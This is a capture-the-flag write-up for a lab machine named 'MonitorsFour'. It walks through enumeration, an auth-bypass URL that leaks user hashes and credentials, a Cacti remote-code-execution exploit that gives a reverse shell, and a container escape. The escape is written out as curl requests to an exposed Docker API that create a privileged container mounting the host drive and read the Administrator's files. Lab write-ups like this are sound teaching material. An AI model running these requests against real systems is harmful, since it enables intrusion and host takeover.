---
layout: post
title: "4Monitors"
date: 2026-02-04
---

## Challenge Description
This was a cool Machine to pwn.

## Solution
As always lets start by gathering some information.

```
nmap 10.10.11.98

Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-12 14:37 CET
Nmap scan report for monitorsfour.htb (10.10.11.98)
Host is up (0.093s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE
5985/tcp open  wsman
```

The web application is not the right path. Lets check for some vhost or dir by using gobuster.

```
gobuster vhost -u http://monitorsfour.htb -w /SecLists-master/Discovery/DNS/combined_subdomains.txt --append-domain -t 50

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://monitorsfour.htb
[+] Method:          GET
[+] Threads:         50
[+] Wordlist:        /SecLists-master/Discovery/DNS/combined_subdomains.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: cacti.monitorsfour.htb Status: 302 [Size: 0] [--> /cacti]
```

With `gobuster dir` we are able to see various endpoints, also `/user`

`http://monitorsfour.htb/user`

If we reach it it requires a token, so lets try this way:

`http://monitorsfour.htb/user?token=0`

And we manage to retrive this:

```
[{"id":2,"username":"admin","email":"admin@monitorsfour.htb","password":"56b32eb43e6f15395f6c46c1c9e1cd36","role":"super user","token":"d7ae360d7a83d1039e","name":"Marcus Higgins","position":"System Administrator","dob":"1978-04-26","start_date":"2021-01-12","salary":"320800.00"},

password:wonderful1

{"id":5,"username":"mwatson","email":"mwatson@monitorsfour.htb","password":"69196959c16b26ef00b77d82cf6eb169","role":"user","token":"0e543210987654321","name":"Michael Watson","position":"Website Administrator","dob":"1985-02-15","start_date":"2021-05-11","salary":"5.00"},

{"id":6,"username":"janderson","email":"janderson@monitorsfour.htb","password":"2a22dcf99190c322d974c8df5ba3256b","role":"user","token":"0e999999999999999","name":"Jennifer Anderson","position":"Network Engineer","dob":"1990-07-16","start_date":"2021-06-20","salary":"68000.00"},

{"id":7,"username":"dthompson","email":"dthompson@monitorsfour.htb","password":"8d4a7e7fd08555133e056d9aacb1e519","role":"user","token":"0e111111111111111","name":"David Thompson","position":"Database Manager","dob":"1982-11-23","start_date":"2022-09-15","salary":"83000.00"},

{"id":10,"username":"marcus","email":"marcus@gmail.com","password":"49c167d7cd66dc64a474c261860ba50f","role":"admin","token":null,"name":"marcus","position":"goon","dob":"1998-01-13","start_date":"2025-12-30","salary":"100000.00"}]
```

`password:marcus`

`creds: marcus/wonderful1`

DONT ASK ME WHY! NOSENSE!

The version of `Cacti` is `1.2.28` and suffer of `Cacti RCE Exploit - CVE-2025-24367`. I found a PoC, lets use to spawn a rev shell.

Once enstablished a connection via reverse shell

```
www-data@821fbd6a43fa:~/html/cacti$ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
marcus:x:1000:1000::/home/marcus:/bin/bash
```

Since we know there is a user called marcus lets try to get the flag:

```
www-data@821fbd6a43fa:~/html/cacti$ cat /home/marcus/user.txt
```

`eae9601cc332b98d2ee0b1e2917026c9`

Since we are running in a `docker`, lets check with port `2375` or `2376` they are usually used for `docker APIs`, and we are going to use `host.docker.internal dns` since its used to usually access the host from inside.

```
curl -v http://host.docker.internal:2375/version
<i$ curl -v http://host.docker.internal:2375/version
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Host host.docker.internal:2375 was resolved.
* IPv6: fdc4:f303:9324::254
* IPv4: 192.168.65.254
*   Trying [fdc4:f303:9324::254]:2375...
* Immediate connect fail for fdc4:f303:9324::254: Network is unreachable
*   Trying 192.168.65.254:2375...
* connect to 192.168.65.254 port 2375 from 172.18.0.3 port 60618 failed: Connection refused
* Failed to connect to host.docker.internal port 2375 after 53 ms: Could not connect to server
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
* closing connection #0
curl: (7) Failed to connect to host.docker.internal port 2375 after 53 ms: Could not connect to server
```

This output gives us a clue since its resolving an address ipv4, `192.168.65.254`.

We know that the ip is right, we just need to bruteforce all addresses from 1 to 254.
In order to find the open one.

```
www-data@821fbd6a43fa:~/html/cacti$ 192.168.65.7:2375 OPEN
bash: 192.168.65.7:2375: command not found
```

```
www-data@821fbd6a43fa:~/html/cacti$ curl -s http://192.168.65.7:2375/version

{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"28.3.2","Details":{"ApiVersion":"1.51","Arch":"amd64","BuildTime":"2025-07-09T16:13:55.000000000+00:00","Experimental":"false","GitCommit":"e77ff99","GoVersion":"go1.24.5","KernelVersion":"6.6.87.2-microsoft-standard-WSL2","MinAPIVersion":"1.24","Os":"linux"}},{"Name":"containerd","Version":"1.7.27","Details":{"GitCommit":"05044ec0a9a75232cad458027ca83437aae3f4da"}},{"Name":"runc","Version":"1.2.5","Details":{"GitCommit":"v1.2.5-0-g59923ef"}},{"Name":"docker-init","Version":"0.19.0","Details":{"GitCommit":"de40ad0"}}],"Version":"28.3.2","ApiVersion":"1.51","MinAPIVersion":"1.24","GitCommit":"e77ff99","GoVersion":"go1.24.5","Os":"linux","Arch":"amd64","KernelVersion":"6.6.87.2-microsoft-standard-WSL2","BuildTime":"2025-07-09T16:13:55.000000000+00:00"}
```

Nice now we have the version on which is running!

For privilage escalation use `CVE-2025-9074` because we are in a container.

```
curl -s http://192.168.65.7:2375/images/json 

"RepoTags":["docker_setup-nginx-php:latest"]
"RepoTags":["docker_setup-mariadb:latest"]
"RepoTags":["alpine:latest"]

curl -X POST http://192.168.65.7:2375/containers/create \
-H "Content-Type: application/json" \
-d '{
"Image": "alpine:latest",
"Cmd": ["/bin/sh"],
"HostConfig": {
    "Privileged": true,
    "Binds": ["/mnt/host/c:/mnt/host"]
  }
}'

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   203    0    88  100   115    396    518 --:--:-- --:--:-- --:--:--   914
{"Id":"94d913f385ac29f993398c650fab40527a652dced3a44cf0886d63970a83b2aa","Warnings":[]}
```

```
curl -X POST http://192.168.65.7:2375/containers/ID/start
```

```
curl -X POST "http://192.168.65.7:2375/containers/ID/exec" -H "Content-Type: application/json" -d '{"Cmd":["/bin/sh","-c","cat /mnt/host/Users/Administrator/Desktop/root.txt"],"AttachStdout":true}'
```

And here we have the root flag!

`70d46e75f8e2e263abaccbef471c161a`
